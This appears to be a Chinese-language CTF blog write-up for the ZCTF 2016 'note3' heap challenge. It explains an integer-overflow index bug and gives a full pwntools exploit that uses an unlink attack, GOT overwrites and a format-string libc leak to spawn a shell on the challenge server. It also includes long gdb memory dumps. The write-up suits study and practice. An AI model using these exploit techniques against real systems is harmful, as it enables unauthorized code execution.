---
layout: post
title:  note3(zctf2016)
date:   2022-10-03 00:08:01 +0300
image:  2022-10-03-kitten.jpg
tags:   [ctf,pwn,ubuntu16,unlink,heap,zctf]
---

main

```assembly
void __fastcall main(int a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  alarm(0x3Cu);
  while ( 1 )
  {
    switch ( (unsigned int)sub_400A1B() )
    {
      case 1u:
        new();
        break;
      case 2u:
        show();
        break;
      case 3u:
        edit();
        break;
      case 4u:
        delete();
        break;
      case 5u:
        puts("Bye~");
        exit(0);
      case 6u:
        exit(0);
      default:
        continue;
    }
  }
}
```

new

```assembly
int new()
{
  int i; // [rsp+Ch] [rbp-14h]
  __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 6 && *(&ptr + i); ++i )
    ;
  if ( i == 7 )
    puts("Note is full, add fail");
  puts("Input the length of the note content:(less than 1024)");
  size = sub_4009B9();
  if ( size < 0 )
    return puts("Length error");
  if ( size > 0x400 )
    return puts("Content is too long");
  v3 = malloc(size);
  puts("Input the note content:");
  sub_4008DD(v3, size, 0xALL);
  *(&ptr + i) = v3;
  qword_6020C0[i + 8] = size;
  qword_6020C0[0] = (__int64)*(&ptr + i);
  return printf("note add success, the id is %d\n", (unsigned int)i);
}
```

show

```assembly
int show()
{
  return puts("No show, No leak.");
}
```

edit

```assembly
int sub_400C0D()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v3; // [rsp+8h] [rbp-8h]

  puts("Input the id of the note:");
  v0 = sub_4009B9();
  v3 = v0 % 7;
  if ( v0 % 7 >= v0 )
  {
    v1 = (__int64)*(&ptr + v3);
    if ( v1 )
    {
      puts("Input the new content:");
      sub_4008DD(*(&ptr + v3), qword_6020C0[v3 + 8], 0xALL);
      qword_6020C0[0] = (__int64)*(&ptr + v3);
      LODWORD(v1) = puts("Edit success");
    }
  }
  else
  {
    LODWORD(v1) = puts("please input correct id.");
  }
  return v1;
}
```

这里面在获取用户输入的 id 号之后并没有进行验证。如果输入的 id 是负数的话依然可以执行。 在 get_num 函数中存在整数溢出漏洞，我们可以获得一个负数。

> v0 % 7 >= v0

v0为负数，使得v0 % 7 >= v0

要使v3=-1，这里因为v0的类型为int64，所以构造-0x8000000000000000

![]({{site.baseurl}}/img/2022-10-03-v0.jpg)

因此我们可以使得 edit 编辑的指针为ptr-1，使用的 size 是 note7_ptr，所以就可以溢出

delete

```assembly
int delete()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v3; // [rsp+8h] [rbp-8h]

  puts("Input the id of the note:");
  v0 = sub_4009B9();
  v3 = v0 % 7;
  if ( v0 % 7 >= v0 )
  {
    v1 = (__int64)*(&ptr + v3);
    if ( v1 )
    {
      free(*(&ptr + v3));
      if ( (void *)qword_6020C0[0] == *(&ptr + v3) )
        qword_6020C0[0] = 0LL;
      *(&ptr + v3) = 0LL;
      LODWORD(v1) = puts("Delete success");
    }
  }
  else
  {
    LODWORD(v1) = puts("please input correct id.");
  }
  return v1;
}
```

exp

```assembly
from pwn import *
from LibcSearcher import *

io = remote("node4.buuoj.cn", 27726)

def add(size,data):
    io.recvuntil('>>')
    io.sendline('1')
    io.recvuntil('1024)')
    io.sendline(str(size))
    io.recvuntil('content:')
    io.sendline(data)
    io.recvuntil('\n')

def edit(id,data):
    io.recvuntil('>>')
    io.sendline('3')
    io.recvuntil('note:')
    io.sendline(str(id))
    io.recvuntil('ent:')
    io.sendline(data)
    io.recvuntil('success')

def free(id):
    io.recvuntil('>>')
    io.sendline('4')
    io.recvuntil('note:')
    io.sendline(str(id))
    io.recvuntil('success')


add(512,'a')
add(512,'a')
add(512,'a')
add(512,'a')
add(512,'a')
add(512,'a')
add(512,'a')
add(512,'a')


target = 0x6020e0  # 3
fd = target - 0x18
bk = target - 0x10

payload = p64(0) + p64(512+1)
payload += p64(fd) + p64(bk)
payload += 'A'*(512-32) + p64(512) + p64(512+16)
edit(3,'aaaaaaaa')
edit(-9223372036854775808, payload)  # 3
'''
gdb-peda$ x/300gx 0x00000000012c6000
0x12c6000:	0x0000000000000000	0x0000000000000211 0
0x12c6010:	0x0000000000000061	0x0000000000000000
0x12c6020:	0x0000000000000000	0x0000000000000000
0x12c6030:	0x0000000000000000	0x0000000000000000
0x12c6040:	0x0000000000000000	0x0000000000000000
0x12c6050:	0x0000000000000000	0x0000000000000000
0x12c6060:	0x0000000000000000	0x0000000000000000
0x12c6070:	0x0000000000000000	0x0000000000000000
0x12c6080:	0x0000000000000000	0x0000000000000000
0x12c6090:	0x0000000000000000	0x0000000000000000
0x12c60a0:	0x0000000000000000	0x0000000000000000
0x12c60b0:	0x0000000000000000	0x0000000000000000
0x12c60c0:	0x0000000000000000	0x0000000000000000
0x12c60d0:	0x0000000000000000	0x0000000000000000
0x12c60e0:	0x0000000000000000	0x0000000000000000
0x12c60f0:	0x0000000000000000	0x0000000000000000
0x12c6100:	0x0000000000000000	0x0000000000000000
0x12c6110:	0x0000000000000000	0x0000000000000000
0x12c6120:	0x0000000000000000	0x0000000000000000
0x12c6130:	0x0000000000000000	0x0000000000000000
0x12c6140:	0x0000000000000000	0x0000000000000000
0x12c6150:	0x0000000000000000	0x0000000000000000
0x12c6160:	0x0000000000000000	0x0000000000000000
0x12c6170:	0x0000000000000000	0x0000000000000000
0x12c6180:	0x0000000000000000	0x0000000000000000
0x12c6190:	0x0000000000000000	0x0000000000000000
0x12c61a0:	0x0000000000000000	0x0000000000000000
0x12c61b0:	0x0000000000000000	0x0000000000000000
0x12c61c0:	0x0000000000000000	0x0000000000000000
0x12c61d0:	0x0000000000000000	0x0000000000000000
0x12c61e0:	0x0000000000000000	0x0000000000000000
0x12c61f0:	0x0000000000000000	0x0000000000000000
0x12c6200:	0x0000000000000000	0x0000000000000000
0x12c6210:	0x0000000000000000	0x0000000000000211 1
0x12c6220:	0x0000000000000061	0x0000000000000000
0x12c6230:	0x0000000000000000	0x0000000000000000
0x12c6240:	0x0000000000000000	0x0000000000000000
0x12c6250:	0x0000000000000000	0x0000000000000000
0x12c6260:	0x0000000000000000	0x0000000000000000
0x12c6270:	0x0000000000000000	0x0000000000000000
0x12c6280:	0x0000000000000000	0x0000000000000000
0x12c6290:	0x0000000000000000	0x0000000000000000
0x12c62a0:	0x0000000000000000	0x0000000000000000
0x12c62b0:	0x0000000000000000	0x0000000000000000
0x12c62c0:	0x0000000000000000	0x0000000000000000
0x12c62d0:	0x0000000000000000	0x0000000000000000
0x12c62e0:	0x0000000000000000	0x0000000000000000
0x12c62f0:	0x0000000000000000	0x0000000000000000
0x12c6300:	0x0000000000000000	0x0000000000000000
0x12c6310:	0x0000000000000000	0x0000000000000000
0x12c6320:	0x0000000000000000	0x0000000000000000
0x12c6330:	0x0000000000000000	0x0000000000000000
0x12c6340:	0x0000000000000000	0x0000000000000000
0x12c6350:	0x0000000000000000	0x0000000000000000
0x12c6360:	0x0000000000000000	0x0000000000000000
0x12c6370:	0x0000000000000000	0x0000000000000000
0x12c6380:	0x0000000000000000	0x0000000000000000
0x12c6390:	0x0000000000000000	0x0000000000000000
0x12c63a0:	0x0000000000000000	0x0000000000000000
0x12c63b0:	0x0000000000000000	0x0000000000000000
0x12c63c0:	0x0000000000000000	0x0000000000000000
0x12c63d0:	0x0000000000000000	0x0000000000000000
0x12c63e0:	0x0000000000000000	0x0000000000000000
0x12c63f0:	0x0000000000000000	0x0000000000000000
0x12c6400:	0x0000000000000000	0x0000000000000000
0x12c6410:	0x0000000000000000	0x0000000000000000
0x12c6420:	0x0000000000000000	0x0000000000000211 2
0x12c6430:	0x0000000000000061	0x0000000000000000
0x12c6440:	0x0000000000000000	0x0000000000000000
0x12c6450:	0x0000000000000000	0x0000000000000000
0x12c6460:	0x0000000000000000	0x0000000000000000
0x12c6470:	0x0000000000000000	0x0000000000000000
0x12c6480:	0x0000000000000000	0x0000000000000000
0x12c6490:	0x0000000000000000	0x0000000000000000
0x12c64a0:	0x0000000000000000	0x0000000000000000
0x12c64b0:	0x0000000000000000	0x0000000000000000
0x12c64c0:	0x0000000000000000	0x0000000000000000
0x12c64d0:	0x0000000000000000	0x0000000000000000
0x12c64e0:	0x0000000000000000	0x0000000000000000
0x12c64f0:	0x0000000000000000	0x0000000000000000
0x12c6500:	0x0000000000000000	0x0000000000000000
0x12c6510:	0x0000000000000000	0x0000000000000000
0x12c6520:	0x0000000000000000	0x0000000000000000
0x12c6530:	0x0000000000000000	0x0000000000000000
0x12c6540:	0x0000000000000000	0x0000000000000000
0x12c6550:	0x0000000000000000	0x0000000000000000
0x12c6560:	0x0000000000000000	0x0000000000000000
0x12c6570:	0x0000000000000000	0x0000000000000000
0x12c6580:	0x0000000000000000	0x0000000000000000
0x12c6590:	0x0000000000000000	0x0000000000000000
0x12c65a0:	0x0000000000000000	0x0000000000000000
0x12c65b0:	0x0000000000000000	0x0000000000000000
0x12c65c0:	0x0000000000000000	0x0000000000000000
0x12c65d0:	0x0000000000000000	0x0000000000000000
0x12c65e0:	0x0000000000000000	0x0000000000000000
0x12c65f0:	0x0000000000000000	0x0000000000000000
0x12c6600:	0x0000000000000000	0x0000000000000000
0x12c6610:	0x0000000000000000	0x0000000000000000
0x12c6620:	0x0000000000000000	0x0000000000000000
0x12c6630:	0x0000000000000000	0x0000000000000211 3
0x12c6640:	0x0000000000000000	0x0000000000000201
0x12c6650:	0x00000000006020c8	0x00000000006020d0
0x12c6660:	0x4141414141414141	0x4141414141414141
0x12c6670:	0x4141414141414141	0x4141414141414141
0x12c6680:	0x4141414141414141	0x4141414141414141
0x12c6690:	0x4141414141414141	0x4141414141414141
0x12c66a0:	0x4141414141414141	0x4141414141414141
0x12c66b0:	0x4141414141414141	0x4141414141414141
0x12c66c0:	0x4141414141414141	0x4141414141414141
0x12c66d0:	0x4141414141414141	0x4141414141414141
0x12c66e0:	0x4141414141414141	0x4141414141414141
0x12c66f0:	0x4141414141414141	0x4141414141414141
0x12c6700:	0x4141414141414141	0x4141414141414141
0x12c6710:	0x4141414141414141	0x4141414141414141
0x12c6720:	0x4141414141414141	0x4141414141414141
0x12c6730:	0x4141414141414141	0x4141414141414141
0x12c6740:	0x4141414141414141	0x4141414141414141
0x12c6750:	0x4141414141414141	0x4141414141414141
0x12c6760:	0x4141414141414141	0x4141414141414141
0x12c6770:	0x4141414141414141	0x4141414141414141
0x12c6780:	0x4141414141414141	0x4141414141414141
0x12c6790:	0x4141414141414141	0x4141414141414141
0x12c67a0:	0x4141414141414141	0x4141414141414141
0x12c67b0:	0x4141414141414141	0x4141414141414141
0x12c67c0:	0x4141414141414141	0x4141414141414141
0x12c67d0:	0x4141414141414141	0x4141414141414141
0x12c67e0:	0x4141414141414141	0x4141414141414141
0x12c67f0:	0x4141414141414141	0x4141414141414141
0x12c6800:	0x4141414141414141	0x4141414141414141
0x12c6810:	0x4141414141414141	0x4141414141414141
0x12c6820:	0x4141414141414141	0x4141414141414141
0x12c6830:	0x4141414141414141	0x4141414141414141
0x12c6840:	0x0000000000000200	0x0000000000000210 4
0x12c6850:	0x0000000000000000	0x0000000000000000
0x12c6860:	0x0000000000000000	0x0000000000000000
0x12c6870:	0x0000000000000000	0x0000000000000000
0x12c6880:	0x0000000000000000	0x0000000000000000
0x12c6890:	0x0000000000000000	0x0000000000000000
0x12c68a0:	0x0000000000000000	0x0000000000000000
0x12c68b0:	0x0000000000000000	0x0000000000000000
0x12c68c0:	0x0000000000000000	0x0000000000000000
0x12c68d0:	0x0000000000000000	0x0000000000000000
0x12c68e0:	0x0000000000000000	0x0000000000000000
0x12c68f0:	0x0000000000000000	0x0000000000000000
0x12c6900:	0x0000000000000000	0x0000000000000000
0x12c6910:	0x0000000000000000	0x0000000000000000
0x12c6920:	0x0000000000000000	0x0000000000000000
0x12c6930:	0x0000000000000000	0x0000000000000000
0x12c6940:	0x0000000000000000	0x0000000000000000
0x12c6950:	0x0000000000000000	0x0000000000000000
0x12c6960:	0x0000000000000000	0x0000000000000000
0x12c6970:	0x0000000000000000	0x0000000000000000
0x12c6980:	0x0000000000000000	0x0000000000000000
0x12c6990:	0x0000000000000000	0x0000000000000000
0x12c69a0:	0x0000000000000000	0x0000000000000000
0x12c69b0:	0x0000000000000000	0x0000000000000000
0x12c69c0:	0x0000000000000000	0x0000000000000000
0x12c69d0:	0x0000000000000000	0x0000000000000000
0x12c69e0:	0x0000000000000000	0x0000000000000000
0x12c69f0:	0x0000000000000000	0x0000000000000000
0x12c6a00:	0x0000000000000000	0x0000000000000000
0x12c6a10:	0x0000000000000000	0x0000000000000000
0x12c6a20:	0x0000000000000000	0x0000000000000000
0x12c6a30:	0x0000000000000000	0x0000000000000000
0x12c6a40:	0x0000000000000000	0x0000000000000000
'''

free(4)
'''
gdb-peda$ x/400gx 0x0000000001dac000
0x1dac000:	0x0000000000000000	0x0000000000000211 0
0x1dac010:	0x0000000000000061	0x0000000000000000
0x1dac020:	0x0000000000000000	0x0000000000000000
0x1dac030:	0x0000000000000000	0x0000000000000000
0x1dac040:	0x0000000000000000	0x0000000000000000
0x1dac050:	0x0000000000000000	0x0000000000000000
0x1dac060:	0x0000000000000000	0x0000000000000000
0x1dac070:	0x0000000000000000	0x0000000000000000
0x1dac080:	0x0000000000000000	0x0000000000000000
0x1dac090:	0x0000000000000000	0x0000000000000000
0x1dac0a0:	0x0000000000000000	0x0000000000000000
0x1dac0b0:	0x0000000000000000	0x0000000000000000
0x1dac0c0:	0x0000000000000000	0x0000000000000000
0x1dac0d0:	0x0000000000000000	0x0000000000000000
0x1dac0e0:	0x0000000000000000	0x0000000000000000
0x1dac0f0:	0x0000000000000000	0x0000000000000000
0x1dac100:	0x0000000000000000	0x0000000000000000
0x1dac110:	0x0000000000000000	0x0000000000000000
0x1dac120:	0x0000000000000000	0x0000000000000000
0x1dac130:	0x0000000000000000	0x0000000000000000
0x1dac140:	0x0000000000000000	0x0000000000000000
0x1dac150:	0x0000000000000000	0x0000000000000000
0x1dac160:	0x0000000000000000	0x0000000000000000
0x1dac170:	0x0000000000000000	0x0000000000000000
0x1dac180:	0x0000000000000000	0x0000000000000000
0x1dac190:	0x0000000000000000	0x0000000000000000
0x1dac1a0:	0x0000000000000000	0x0000000000000000
0x1dac1b0:	0x0000000000000000	0x0000000000000000
0x1dac1c0:	0x0000000000000000	0x0000000000000000
0x1dac1d0:	0x0000000000000000	0x0000000000000000
0x1dac1e0:	0x0000000000000000	0x0000000000000000
0x1dac1f0:	0x0000000000000000	0x0000000000000000
0x1dac200:	0x0000000000000000	0x0000000000000000
0x1dac210:	0x0000000000000000	0x0000000000000211 1
0x1dac220:	0x0000000000000061	0x0000000000000000
0x1dac230:	0x0000000000000000	0x0000000000000000
0x1dac240:	0x0000000000000000	0x0000000000000000
0x1dac250:	0x0000000000000000	0x0000000000000000
0x1dac260:	0x0000000000000000	0x0000000000000000
0x1dac270:	0x0000000000000000	0x0000000000000000
0x1dac280:	0x0000000000000000	0x0000000000000000
0x1dac290:	0x0000000000000000	0x0000000000000000
0x1dac2a0:	0x0000000000000000	0x0000000000000000
0x1dac2b0:	0x0000000000000000	0x0000000000000000
0x1dac2c0:	0x0000000000000000	0x0000000000000000
0x1dac2d0:	0x0000000000000000	0x0000000000000000
0x1dac2e0:	0x0000000000000000	0x0000000000000000
0x1dac2f0:	0x0000000000000000	0x0000000000000000
0x1dac300:	0x0000000000000000	0x0000000000000000
0x1dac310:	0x0000000000000000	0x0000000000000000
0x1dac320:	0x0000000000000000	0x0000000000000000
0x1dac330:	0x0000000000000000	0x0000000000000000
0x1dac340:	0x0000000000000000	0x0000000000000000
0x1dac350:	0x0000000000000000	0x0000000000000000
0x1dac360:	0x0000000000000000	0x0000000000000000
0x1dac370:	0x0000000000000000	0x0000000000000000
0x1dac380:	0x0000000000000000	0x0000000000000000
0x1dac390:	0x0000000000000000	0x0000000000000000
0x1dac3a0:	0x0000000000000000	0x0000000000000000
0x1dac3b0:	0x0000000000000000	0x0000000000000000
0x1dac3c0:	0x0000000000000000	0x0000000000000000
0x1dac3d0:	0x0000000000000000	0x0000000000000000
0x1dac3e0:	0x0000000000000000	0x0000000000000000
0x1dac3f0:	0x0000000000000000	0x0000000000000000
0x1dac400:	0x0000000000000000	0x0000000000000000
0x1dac410:	0x0000000000000000	0x0000000000000000
0x1dac420:	0x0000000000000000	0x0000000000000211 2
0x1dac430:	0x0000000000000061	0x0000000000000000
0x1dac440:	0x0000000000000000	0x0000000000000000
0x1dac450:	0x0000000000000000	0x0000000000000000
0x1dac460:	0x0000000000000000	0x0000000000000000
0x1dac470:	0x0000000000000000	0x0000000000000000
0x1dac480:	0x0000000000000000	0x0000000000000000
0x1dac490:	0x0000000000000000	0x0000000000000000
0x1dac4a0:	0x0000000000000000	0x0000000000000000
0x1dac4b0:	0x0000000000000000	0x0000000000000000
0x1dac4c0:	0x0000000000000000	0x0000000000000000
0x1dac4d0:	0x0000000000000000	0x0000000000000000
0x1dac4e0:	0x0000000000000000	0x0000000000000000
0x1dac4f0:	0x0000000000000000	0x0000000000000000
0x1dac500:	0x0000000000000000	0x0000000000000000
0x1dac510:	0x0000000000000000	0x0000000000000000
0x1dac520:	0x0000000000000000	0x0000000000000000
0x1dac530:	0x0000000000000000	0x0000000000000000
0x1dac540:	0x0000000000000000	0x0000000000000000
0x1dac550:	0x0000000000000000	0x0000000000000000
0x1dac560:	0x0000000000000000	0x0000000000000000
0x1dac570:	0x0000000000000000	0x0000000000000000
0x1dac580:	0x0000000000000000	0x0000000000000000
0x1dac590:	0x0000000000000000	0x0000000000000000
0x1dac5a0:	0x0000000000000000	0x0000000000000000
0x1dac5b0:	0x0000000000000000	0x0000000000000000
0x1dac5c0:	0x0000000000000000	0x0000000000000000
0x1dac5d0:	0x0000000000000000	0x0000000000000000
0x1dac5e0:	0x0000000000000000	0x0000000000000000
0x1dac5f0:	0x0000000000000000	0x0000000000000000
0x1dac600:	0x0000000000000000	0x0000000000000000
0x1dac610:	0x0000000000000000	0x0000000000000000
0x1dac620:	0x0000000000000000	0x0000000000000000
0x1dac630:	0x0000000000000000	0x0000000000000211 3
0x1dac640:	0x0000000000000000	0x0000000000000411
0x1dac650:	0x00007f548babeb78	0x00007f548babeb78
0x1dac660:	0x0000000000000000	0x0000000000000000
0x1dac670:	0x4141414141414141	0x4141414141414141
0x1dac680:	0x4141414141414141	0x4141414141414141
0x1dac690:	0x4141414141414141	0x4141414141414141
0x1dac6a0:	0x4141414141414141	0x4141414141414141
0x1dac6b0:	0x4141414141414141	0x4141414141414141
0x1dac6c0:	0x4141414141414141	0x4141414141414141
0x1dac6d0:	0x4141414141414141	0x4141414141414141
0x1dac6e0:	0x4141414141414141	0x4141414141414141
0x1dac6f0:	0x4141414141414141	0x4141414141414141
0x1dac700:	0x4141414141414141	0x4141414141414141
0x1dac710:	0x4141414141414141	0x4141414141414141
0x1dac720:	0x4141414141414141	0x4141414141414141
0x1dac730:	0x4141414141414141	0x4141414141414141
0x1dac740:	0x4141414141414141	0x4141414141414141
0x1dac750:	0x4141414141414141	0x4141414141414141
0x1dac760:	0x4141414141414141	0x4141414141414141
0x1dac770:	0x4141414141414141	0x4141414141414141
0x1dac780:	0x4141414141414141	0x4141414141414141
0x1dac790:	0x4141414141414141	0x4141414141414141
0x1dac7a0:	0x4141414141414141	0x4141414141414141
0x1dac7b0:	0x4141414141414141	0x4141414141414141
0x1dac7c0:	0x4141414141414141	0x4141414141414141
0x1dac7d0:	0x4141414141414141	0x4141414141414141
0x1dac7e0:	0x4141414141414141	0x4141414141414141
0x1dac7f0:	0x4141414141414141	0x4141414141414141
0x1dac800:	0x4141414141414141	0x4141414141414141
0x1dac810:	0x4141414141414141	0x4141414141414141
0x1dac820:	0x4141414141414141	0x4141414141414141
0x1dac830:	0x4141414141414141	0x4141414141414141
0x1dac840:	0x0000000000000200	0x0000000000000210
0x1dac850:	0x0000000000000000	0x0000000000000000
0x1dac860:	0x0000000000000000	0x0000000000000000
0x1dac870:	0x0000000000000000	0x0000000000000000
0x1dac880:	0x0000000000000000	0x0000000000000000
0x1dac890:	0x0000000000000000	0x0000000000000000
0x1dac8a0:	0x0000000000000000	0x0000000000000000
0x1dac8b0:	0x0000000000000000	0x0000000000000000
0x1dac8c0:	0x0000000000000000	0x0000000000000000
0x1dac8d0:	0x0000000000000000	0x0000000000000000
0x1dac8e0:	0x0000000000000000	0x0000000000000000
0x1dac8f0:	0x0000000000000000	0x0000000000000000
0x1dac900:	0x0000000000000000	0x0000000000000000
0x1dac910:	0x0000000000000000	0x0000000000000000
0x1dac920:	0x0000000000000000	0x0000000000000000
0x1dac930:	0x0000000000000000	0x0000000000000000
0x1dac940:	0x0000000000000000	0x0000000000000000
0x1dac950:	0x0000000000000000	0x0000000000000000
0x1dac960:	0x0000000000000000	0x0000000000000000
0x1dac970:	0x0000000000000000	0x0000000000000000
0x1dac980:	0x0000000000000000	0x0000000000000000
0x1dac990:	0x0000000000000000	0x0000000000000000
0x1dac9a0:	0x0000000000000000	0x0000000000000000
0x1dac9b0:	0x0000000000000000	0x0000000000000000
0x1dac9c0:	0x0000000000000000	0x0000000000000000
0x1dac9d0:	0x0000000000000000	0x0000000000000000
0x1dac9e0:	0x0000000000000000	0x0000000000000000
0x1dac9f0:	0x0000000000000000	0x0000000000000000
0x1daca00:	0x0000000000000000	0x0000000000000000
0x1daca10:	0x0000000000000000	0x0000000000000000
0x1daca20:	0x0000000000000000	0x0000000000000000
0x1daca30:	0x0000000000000000	0x0000000000000000
0x1daca40:	0x0000000000000000	0x0000000000000000
'''
'''
gdb-peda$ x/20gx 0x6020c0 
0x6020c0:	0x0000000001dac640	0x0000000001dac010
0x6020d0:	0x0000000001dac220	0x0000000001dac430
0x6020e0:	0x00000000006020c8	0x0000000000000000
0x6020f0:	0x0000000001daca60	0x0000000001dacc70
0x602100:	0x0000000001dadf00	0x0000000000000200
0x602110:	0x0000000000000200	0x0000000000000200
0x602120:	0x0000000000000200	0x0000000000000200
0x602130:	0x0000000000000200	0x0000000000000200
'''

free_got = 0x602018
puts_got = 0x602020
puts_plt = 0x400730
printf_plt = 0x400750


edit(3, p64(free_got))
edit(0, p64(printf_plt) + p64(printf_plt))

edit(3, p64(0x6020e8))
edit(0, '%llx.'*30)

io.recvuntil('>>')
io.sendline('4')
io.recvuntil('note:')
io.sendline(str(0))

s =  io.recvuntil('success')
print(s)
'''
gdb-peda$ x/20gx 0x7fbc04666840
0x7fbc04666840 <__libc_start_main+240>:	0x31000197f9e8c789	0x8b48ffffff3be9d2
0x7fbc04666850 <__libc_start_main+256>:	0xc8c148003a8ebb05	0x0030250433486411
'''

addr = int(s.split('.')[10], 16) - 240
print(hex(addr))


libc = LibcSearcher("__libc_start_main", addr)
base = addr - libc.dump("__libc_start_main")
system = base + libc.dump("system")

atoi_got = 0x602070
edit(3, p64(atoi_got))
edit(0, p64(system))

io.recvuntil("option--->>")
io.sendline("/bin/sh")


io.interactive()
```

这里之前尝试把free_got写成puts_plt没有成功

```assembly
edit(3, p64(free_got) + p64(puts_got))
edit(0, p32(puts_plt))
```

原因是

![]({{site.baseurl}}/img/2022-10-03-zero.jpg)

应该写为

```assembly
edit(3, p64(free_got) + p64(puts_got))
dbg()
edit(0, p32(puts_plt)+'\x00')
pause()
```

